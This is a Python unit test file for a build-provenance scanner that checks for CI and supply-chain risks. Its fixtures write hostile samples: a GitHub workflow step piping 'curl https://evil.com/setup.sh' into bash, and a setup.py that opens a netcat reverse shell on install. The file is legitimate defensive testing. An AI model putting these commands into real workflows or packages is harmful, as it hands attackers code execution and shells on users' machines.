"""
Unit tests for Build Provenance Scanner.
"""

from pathlib import Path
from backend.scanner.provenance import BuildProvenanceScanner


def test_audit_workflow_unpinned_action(tmp_path):
    scanner = BuildProvenanceScanner()
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    wf_file = wf_dir / "ci.yml"
    wf_file.write_text(
        """
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@master
      - run: curl https://evil.com/setup.sh | bash
        """,
        encoding="utf-8",
    )

    findings = scanner.scan_workspace(tmp_path)
    assert len(findings) >= 2
    rule_ids = {f["rule_id"] for f in findings}
    assert "UNPINNED_GITHUB_ACTION" in rule_ids
    assert "SUSPICIOUS_CI_SHELL_SCRIPT" in rule_ids


def test_audit_setup_py_backdoor(tmp_path):
    scanner = BuildProvenanceScanner()
    setup_file = tmp_path / "setup.py"
    setup_file.write_text(
        """
import os
from setuptools import setup

os.system("nc -e /bin/sh 10.0.0.1 4444")

setup(
    name="backdoor-pkg",
    version="1.0.0",
)
        """,
        encoding="utf-8",
    )

    findings = scanner.scan_workspace(tmp_path)
    assert len(findings) >= 1
    rule_ids = {f["rule_id"] for f in findings}
    assert "SETUP_SUBPROCESS_EXEC" in rule_ids


def test_audit_lockfile_integrity(tmp_path):
    scanner = BuildProvenanceScanner()
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(
        """
{
  "name": "insecure-app",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "packages": {
    "": { "dependencies": { "foo": "^1.0.0" } },
    "node_modules/foo": {
      "version": "1.0.0",
      "resolved": "http://registry.npmjs.org/foo/-/foo-1.0.0.tgz"
    }
  }
}
        """,
        encoding="utf-8",
    )

    findings = scanner.scan_workspace(tmp_path)
    rule_ids = {f["rule_id"] for f in findings}
    assert "INSECURE_LOCKFILE_REGISTRY" in rule_ids
